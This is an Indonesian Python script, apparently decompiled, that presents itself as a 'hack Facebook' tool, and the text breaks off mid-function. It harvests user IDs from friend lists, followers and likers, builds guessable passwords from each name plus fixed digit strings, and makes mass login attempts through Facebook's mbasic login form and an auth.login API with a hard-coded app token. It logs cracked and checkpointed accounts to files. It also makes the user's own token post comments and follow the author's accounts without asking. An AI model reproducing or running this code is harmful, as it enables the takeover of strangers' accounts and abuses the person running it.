# Decompile by HanzTzy
Massage_Author = ("""

~~> Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!

~~> Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu

~~> Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah

~~> insgrm : https://www.instagram.com/anggatp55

~~> fb     : https://www.facebook.com/AnggaXD13

~~> Maaf klo codinganya berantakan dan banyak bug:)

""")

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from datetime import date
from datetime import datetime
from urllib.parse import quote


if ("linux" in sys.platform.lower()):
    p = "\033[0;37m" # putih
    m = "\033[0;31m" # merah
    h = "\033[0;32m" # hijau
    k = "\033[0;33m" # kuning
    b = "\033[0;34m" # biru
    u = "\033[0;35m" # ungu
    o = "\033[0;36m" # biru muda
else:
    p = "" # putih
    m = "" # merah
    h = "" # hijau
    k = "" # kuning
    b = "" # biru
    u = "" # ungu
    o = "" # biru muda


host = "https://mbasic.facebook.com"
def banner():
    print("""\033[1;37m
       ___    _   __   ___    ____
      / \033[1;91mo\033[1;37m.)  / \,' /  / \033[1;91mo\033[1;37m.)  / __/
     / \033[1;91mo\033[1;37m \  / \,' /  / \033[1;91mo\033[1;37m \  / _/  \033[1;33m•\033[1;91m•\033[1;37m orb\033[1;91mXD\033[1;37m.
    /___,' /_/ /_/  /___,' /_/     
  \033[1;33m•\033[1;91m•\033[1;37m New Tools Hack Facebook Random \033[1;33m•\033[1;91m•\033[1;37m
 \033[1;33m•\033[1;91m•\033[1;37m Gunakan Akun Tumbal Untuk Login! \033[1;33m•\033[1;91m•\033[1;37m
\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m""")

id = []
ttl = []
ok = []
cp = []


_uax_='Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
_uan_='nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
_uaa_='Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
_uao_='Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
_uas_='Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'


urlw=("https://wa.me/+6281567607136")
urll=("https://github.com/Mayura-X/unik-codenighter/blob/main/ahh-memek-araa-enak")
__sys__deku=os.system
_deku_uraraka=print
__in__deku__=input
__req__get__=requests.get
__req__post__=requests.post
__remake__=os.rename
__subrek__ = random.choice(["https://youtube.com/c/orbXDBdbsS","https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ"])
__youtuber__=__subrek__



current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

def clear():
    if " linux" in sys.platform.lower():
        __sys__deku("clear")
    elif "win" in sys.platform.lower():
        __sys__deku("cls")
    else:__sys__deku("clear")

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)



def logs():
    __sys__deku("clear");banner()
    _deku_uraraka("\n%s [%s01%s] Login token"%(p,k,p));__deku__=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if __deku__ in ["1","01"]:
        log_token()
    else:_deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))

def log_token():
    __sys__deku("clear");banner()
    __tokenn__=__in__deku__("\n %s[%s•%s•%s] Token: "%(p,m,k,p))
    try:
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__tokenn__))
        open("login.txt", "w").write(__tokenn__)
        _deku_uraraka(" %s[%s•%s•%s] Login berhasil "%(p,m,k,p))
        jalan(" %s[%s•%s•%s] Please subscribe my channel"%(p,m,k,p))
        __sys__deku('xdg-open %s'%(__youtuber__))
        deku_chan()
        menu()
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] Login gagal"%(p,m,k,p));logs()
        #os.system("xdg-open https://youtu.be/qhxw5BVUBlE")
        logs()


komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Bjir BiiDev Femes Cuk Gua Ampe Mrinding", "Tumben Post Bang?", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])


kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?","moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang","tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
__komen__ = (komtwol)
__komendua__ = (kazutora)
__post__ = ("3909741969124574")
__postdua__ = ("4134869446611824")
__id__ebink=("100002664282607")
__id__meyrina=("100000419639430")
__id__mieruko=("100027294159255")
__id__tsukasa=("1752684667")
__id__halaman_ngapak_code=("281364506990489")

def deku_chan():
    global __token__
    try:
        __token__=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__token__))
    except IOError:
        _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
    __req__post__('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(__post__,__komen__,__token__))
    __req__post__('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(__postdua__,__komendua__,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__ebink,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__meyrina,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__mieruko,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__tsukasa,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__halaman_ngapak_code,__token__))
    #__req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(_function_code,__token__))


def menu():
    global __token__
    try:
        __token__=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__token__))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['first_name']
    except (KeyError,IOError):
        _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
    try:
        su=open("lisenc.log","r").read()
        _suc=__req__get__(urll).text.strip()
        if su in _suc:
            kontol=("premium")
            open("dekura.txt","w").write(kontol)
        else:
            jembud=("not premium");__sys__deku("rm -rf url.txt")
            open("dekura.txt","w").write(jembud)
    except IOError:
        su=open("dekura.txt","w").write("not premium");__sys__deku("rm -rf url.txt")
    try:
        su=open("dekura.txt","r").read()
        if su == "premium":
            open("url.txt","w").write("https://www.github.com/Dekura-X")
        else:__sys__deku("rm -rf lisenc.log");__sys__deku("rm -rf url.txt")
    except IOError:
        __sys__deku("rm -rf lisenc.log");__sys__deku("rm -rf url.txt")
    __sys__deku("clear");banner()
    _deku_uraraka("\n%s [%s Welcome %s%s%s To My Sc %s]%s"%(b,p,h,_user,p,b,p))
    _deku_uraraka("\n %s[%s•%s•%s] Versi: %s "%(p,m,k,p,su))
    _deku_uraraka("\n%s [%s01%s] Crack id dari list teman sendiri"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Crack id dari list teman publik"%(p,k,p))
    _deku_uraraka("%s [%s03%s] Crack id dari follower"%(p,k,p))
    _deku_uraraka("%s [%s04%s] Crack id dari likes"%(p,k,p))
    _deku_uraraka("%s [%s05%s] Crack id dari files"%(p,k,p))
    _deku_uraraka("%s [%s06%s] Ganti useragent crack"%(p,k,p))
    _deku_uraraka("%s [%s07%s] Check opsi akun fb checkpoint "%(p,k,p))
    _deku_uraraka("%s [%s08%s] Check hasil crack  [ ok - cp ]"%(p,k,p))
    _deku_uraraka("%s [%s99%s] Beli versi premium"%(p,k,p))
    _deku_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _deku_ in ["1","01"]:
        listteman()
    elif _deku_ in ["2","02"]:
        publik()
    elif _deku_ in ["3","03"]:
        followerss()
    elif _deku_ in ["4","04"]:
        likess()
    elif _deku_ in ["5","05"]:
        crackfiles()
    elif _deku_ in ["6","06"]:
        userset()
    elif _deku_ in ["7","07"]:
        cek_hasil()
    elif _deku_ in ["8","08"]:
        cek_results()
    elif _deku_ in ["99"]:
        perbayar()
    else:_deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))

def listteman():
    try:
        _token_=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(_token_))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['name']
    except (KeyError, IOError):
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    try:
        _id_=("me")
        try:
            __tsukasa__ = __req__get__("https://graph.facebook.com/%s?access_token=%s"%(_id_,_token_))
            _jeson_=json.loads(__tsukasa__.text)
            _deku_uraraka("\n %s[%s•%s•%s] User target: %s "%(p,m,k,p,_jeson_['name']))
        except IOError:
            _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
        _multi = __req__get__("https://graph.facebook.com/%s/friends?limit=6000&access_token=%s"%(_id_,_token_))
        _dekura=json.loads(_multi.text)
        _totalkrek = (_jeson_["first_name"]+".json").replace(" ","_")
        _pilesdeku= open(_totalkrek,"w")
        for a in _dekura["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            _pilesdeku.write(a["id"]+"<=>"+a["name"]+"\n")
        _pilesdeku.close()
        if (len(id)) != 0:
            _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
            return crack(_totalkrek)
        else:_deku_uraraka("\n %s[%s•%s•%s] Maaf id anda adalah: %s"%(p,m,k,p,len(id)))
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))


def publik():
    try:
        _token_=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(_token_))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['name']
    except (KeyError, IOError):
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    try:
        _id_=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
        try:
            __tsukasa__ = __req__get__("https://graph.facebook.com/%s?access_token=%s"%(_id_,_token_))
            _jeson_=json.loads(__tsukasa__.text)
            _deku_uraraka("\n %s[%s•%s•%s] User target: %s "%(p,m,k,p,_jeson_['name']))
        except IOError:
            _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
        _multi = __req__get__("https://graph.facebook.com/%s/friends?limit=6000&access_token=%s"%(_id_,_token_))
        _dekura=json.loads(_multi.text)
        _totalkrek = (_jeson_["first_name"]+".json").replace(" ","_")
        _pilesdeku= open(_totalkrek,"w")
        for a in _dekura["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            _pilesdeku.write(a["id"]+"<=>"+a["name"]+"\n")
        _pilesdeku.close()
        if (len(id)) != 0:
            _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
            return crack(_totalkrek)
        else:_deku_uraraka("\n %s[%s•%s•%s] Maaf id anda adalah: %s"%(p,m,k,p,len(id)))
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))

def followerss():
    try:
        _token_=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(_token_))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['name']
    except (KeyError, IOError):
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    try:
        _id_=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
        try:
            __tsukasa__ = __req__get__("https://graph.facebook.com/%s?access_token=%s"%(_id_,_token_))
            _jeson_=json.loads(__tsukasa__.text)
            _deku_uraraka("\n %s[%s•%s•%s] User target: %s "%(p,m,k,p,_jeson_['name']))
        except IOError:
            _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
        _multi = __req__get__("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,_token_))
        _dekura=json.loads(_multi.text)
        _totalkrek = (_jeson_["first_name"]+".json").replace(" ","_")
        _pilesdeku= open(_totalkrek,"w")
        for a in _dekura["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            _pilesdeku.write(a["id"]+"<=>"+a["name"]+"\n")
        _pilesdeku.close()
        if (len(id)) != 0:
            _deku_uraraka(" %s[%s•%s•%s] Total id follower: %s"%(p,m,k,p,len(id)))
            return crack(_totalkrek)
        else:_deku_uraraka("\n %s[%s•%s•%s] Maaf id follower anda adalah: %s"%(p,m,k,p,len(id)))
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))

def likess():
    try:
        _token_=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(_token_))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['name']
    except (KeyError, IOError):
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    try:
        _id_=__in__deku__("\n %s[%s•%s•%s] User id post target: "%(p,m,k,p))
        try:
            __tsukasa__ = __req__get__("https://graph.facebook.com/%s?access_token=%s"%(_id_,_token_))
            _jeson_=json.loads(__tsukasa__.text)
            _deku_uraraka("\n %s[%s•%s•%s] User target: %s "%(p,m,k,p,_jeson_['name']))
        except IOError:
            _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
        _multi = __req__get__("https://graph.facebook.com/%s/likes?limit=20000&access_token=%s"%(_id_,_token_))
        _dekura=json.loads(_multi.text)
        _totalkrek = (_jeson_["first_name"]+".json").replace(" ","_")
        _pilesdeku= open(_totalkrek,"w")
        for a in _dekura["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            _pilesdeku.write(a["id"]+"<=>"+a["name"]+"\n")
        _pilesdeku.close()
        if (len(id)) != 0:
            _deku_uraraka(" %s[%s•%s•%s] Total id like: %s"%(p,m,k,p,len(id)))
            return crack(_totalkrek)
        else:_deku_uraraka("\n %s[%s•%s•%s] Maaf id like anda adalah: %s"%(p,m,k,p,len(id)))
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))

def crackfiles():
    _piles_=__in__deku__("\n %s[%s•%s•%s] Masukan files dump id mu\n %s[%s•%s•%s] Files: "%(p,m,k,p,p,m,k,p))
    try:
        open(_piles_,"r").read()
        __remake__(_piles_,"kontol.json")
        _read_=("kontol.json")
        return crack(_read_)
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))

def userset():
    _deku_uraraka("\n%s [%s01%s] Ganti useragent sendiri"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Ganti useragent sesuai device mu"%(p,k,p))
    _deku_uraraka("%s [%s03%s] Cek useragent sekarang"%(p,k,p))
    _deku_uraraka("%s [%s00%s] Back/kembali"%(p,k,p))
    _pil_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _pil_ in ["1","01"]:
        _userr=__in__deku__("\n %s[%s•%s•%s] Masukan useragent mu\n %s[%s•%s•%s] Useragent: "%(p,m,k,p,p,m,k,p))
        try:
            open("ua","w").write(_userr)
            usera=open("ua","r").read()
        except Exception as e:
            _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))
        if usera == _userr:
            _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
        else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
    elif _pil_ in ["2","02"]: 
        _deku_uraraka("\n %s [%s Select useragent device %s]%s"%(b,p,h,_user,p,b,p))
        _deku_uraraka("\n%s [%s01%s] Useragent nokia"%(p,k,p))
        _deku_uraraka("%s [%s02%s] Useragent xiaomy"%(p,k,p))
        _deku_uraraka("%s [%s03%s] Useragent asus"%(p,k,p))
        _deku_uraraka("%s [%s04%s] Useragent samsung"%(p,k,p))
        _deku_uraraka("%s [%s05%s] Useragent oppo"%(p,k,p))
        _pilua=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p,))
        if _pilua in ["1","01"]:
            open("ua","w").write(_uan_)
            _xec=open("ua","r").read()
            if _xec == _uan_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["2","02"]:
            open("ua","w").write(_uax_)
            _xec=open("ua","r").read()
            if _xec == _uax_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["3","03"]:
            open("ua","w").write(_uaa_)
            _xec=open("ua","r").read()
            if _xec == _uaa_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["4","04"]:
            open("ua","w").write(_uas_)
            _xec=open("ua","r").read()
            if _xec == _uas_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["5","05"]:
            open("ua","w").write(_uao_)
            _xec=open("ua","r").read()
            if _xec == _uao_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p))
    elif _pil_ in ["3","03"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua=""
        _deku_uraraka("\n %s[%s•%s•%s] Useragent: %s"%(p,m,k,p,_tes_ua));time.sleep(1)
    elif _pil_ in ["0","00"]:
        menu()
    else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p))


def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        _deku_uraraka(",\n %s[%s•%s•%s] Akun terkena spam"%(p,m,k,p))
    if "c_user" in ses.cookies:
        _deku_uraraka(" %s[%s•%s•%s] Akun berhasil di login"%(p,m,k,p))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        for opt in range(len(ngew)):
            print(" \033[1;37m[\033[1;33m0"+str(opt+1)+"\033[1;37m] "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        _deku_uraraka(" %s[%s•%s•%s] %s"%(p,m,k,p,oh))
    else:
        _deku_uraraka(" %s[%s•%s•%s] Sandi akun sudah di ganti"%(p,m,k,p))
def cek_hasil():
    _deku_uraraka("\n %s[%s•%s•%s] Masukan file cp\n %s[%s•%s•%s] Contoh file: CP/namefile.txt"%(p,m,k,p,p,m,k,p))
    files =__in__deku__(" %s[%s•%s•%s] nama file: "%(p,m,k,p))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        _deku_uraraka("\n %s[%s•%s•%s] File tidak ada!"%(p,m,k,p))
        time.sleep(2); cek_hasil()
    _deku_uraraka(" %s[%s•%s•%s] Total akun cp: %s\n"%(p,m,k,p,str(len(buka_baju))))
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        _deku_uraraka(" %s[%s•%s•%s] Akun fb: %s"%(p,m,k,p,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        _deku_uraraka("")
    _deku_uraraka("\n %s[%s•%s•%s] Cek akun sudah selesai"%(p,m,k,p))
    __in__deku__("\n %s[%s•%s•%s] Back"%(p,m,k,p))
    menu()

def cek_results():
    try:
        open("OK/%s.txt"%(tanggal))
    except IOError:
        __sys__deku("touch OK/%s.txt"%(tanggal))
    try:
        open("CP/%s.txt"%(tanggal))
    except IOError:
        __sys__deku("touch CP/%s.txt"%(tanggal))
    cp=("CP/%s.txt"%(tanggal))
    ok=("OK/%s.txt"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    _deku_uraraka("\n%s [%s01%s] Cek results cp"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Cek results ok"%(p,k,p))
    _deku_uraraka("%s [%s00%s] Back"%(p,k,p))
    _pil3h=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            _deku_uraraka("\n %s[%s•%s•%s] Results cp"%(p,m,k,p))
            __sys__deku("cat CP/%s.txt"%(tanggal))
        else:_deku_uraraka("\n %s[%s•%s•%s] Tidak ada hasil!"%(p,m,k,p))
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            _deku_uraraka("\n %s[%s•%s•%s] Results ok"%(p,m,k,p))
            __sys__deku("cat OK/%s.txt"%(tanggal))
        else:_deku_uraraka("\n %s[%s•%s•%s] Tidak ada hasil!"%(p,m,k,p))
    elif _pil3h in ["0","00"]:
        menu()
    else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada!"%(p,m,k,p))

def generate(text):
	results=[]
	for name in text.split(" "):
		if len(name)<3:
			continue
		else:
			name=name.lower()
			if len(name)==3 or len(name)==4 or len(name)==5:
				results.append(name)
				results.append(name+"123")
				results.append(name+"1234")
				results.append(name+"12345")
				results.append(name+"123456")
			else:
				results.append(name)
				results.append(name+"123")
				results.append(name+"1234")
				results.append(name+"12345")
				results.append(name+"123456")
	results.append(name.lower())
	results.append("20002000")
	results.append("20012001")
	results.append("123456654321")
	results.append("1234554321")
	results.append("112233445566")
	results.append("1122334455")
	return results

def log_api(em,pas,hosts):
    try:
        ua = open('ua','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    try:
        ua = open('ua','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    try:
        ua = open('ua','r').read()
    except IOError:
